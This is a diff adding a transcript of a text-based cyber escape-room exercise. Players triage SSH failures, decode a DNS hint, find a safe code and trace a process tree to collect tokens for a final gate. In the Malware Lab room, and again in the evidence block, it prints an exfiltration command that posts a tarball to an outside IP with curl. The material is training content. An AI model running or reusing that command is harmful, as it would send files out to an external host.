@@ -1,0 +1,70 @@
+[Game] Cyber Escape Room started. Type 'help' for commands.
+> look
+You are in the Intro Lobby.
+A terminal blinks in the corner. Doors lead to: soc, dns, vault, malware, final.
+> move soc
+You enter the SOC Triage Desk.
+A cluttered screen shows failed SSH login attempts.
+Items here: auth.log
+> inspect auth.log
+[Room SOC] Parsing logs...
+59 failed attempts found in 203.0.113.0/24
+Top IP is 203.0.113.211 (last octet=211)
+Token formed: 21159
+> inventory
+You currently hold: KEYPAD
+> use keypad
+You don't have 'keypad'.
+> use KEYPAD
+Nothing happens when you use KEYPAD.
+> move dns
+You enter the DNS Closet.
+The walls are covered with scribbled key=value pairs.
+Items here: dns.cfg
+> inspect dns.cfg
+[Room DNS] Decoding hints...
+Decoded line: "The authoritative hint ends at relay."
+Token formed: relay
+> move vault
+You enter the Vault Corridor.
+A noisy dump scrolls past. Somewhere a SAFE{a-b-c} hides.
+Items here: vault_dump.txt
+> inspect vault_dump.txt
+[Room Vault] Scanning dump...
+Found candidate: SAFE{16-8-24}
+Checksum: 16+8=24 (OK)
+> move malware
+You enter the Malware Lab.
+A process graph flickers; exfil hides behind an innocent chain.
+Items here: proc_tree.jsonl
+> inspect proc_tree.jsonl
+[Room Malware] Building graph...
+Exfil path found: 4960->4622->4305->8484->2254
+Terminal command: curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz
+> move final
+You stand before the Final Gate. The console asks for proof.
+Items here: gate
+> use gate
+Collected tokens: KEYPAD=21159, PID=2254, SAFE=16-8-24, DNS=relay
+> quit
+[Game] Goodbye. Transcript written to run.txt
+
+TOKEN[KEYPAD]=21159
+EVIDENCE[KEYPAD].TOP24=203.0.113.0/24
+EVIDENCE[KEYPAD].COUNT=59
+EVIDENCE[KEYPAD].SAMPLE=2026-10-05T09:00:03Z lab1 sshd[2065]: Failed password for admin from 203.0.113.211 port 40693 protocol 2
+EVIDENCE[KEYPAD].MALFORMED_SKIPPED=3
+TOKEN[DNS]=relay
+EVIDENCE[DNS].KEY=hint4
+EVIDENCE[DNS].ENCODING=rot13+b64
+EVIDENCE[DNS].DECODED_LINE=The authoritative hint ends at relay.
+TOKEN[SAFE]=16-8-24
+EVIDENCE[SAFE].MATCH="SAFE{16-8-24}"
+EVIDENCE[SAFE].CHECK=16+8=24
+TOKEN[PID]=2254
+EVIDENCE[PID].PATH=[4960->4622->4305->8484->2254]
+EVIDENCE[PID].CMD="curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz"
+EVIDENCE[PID].MALFORMED_SKIPPED=1
+FINAL_GATE=PENDING
+MSG=group04|21159-2254-16-8-24-relay
+HMAC=11a045f0e1abbd30955fce4f597c0a27095029627bfa087ac4e4a58a286e359d
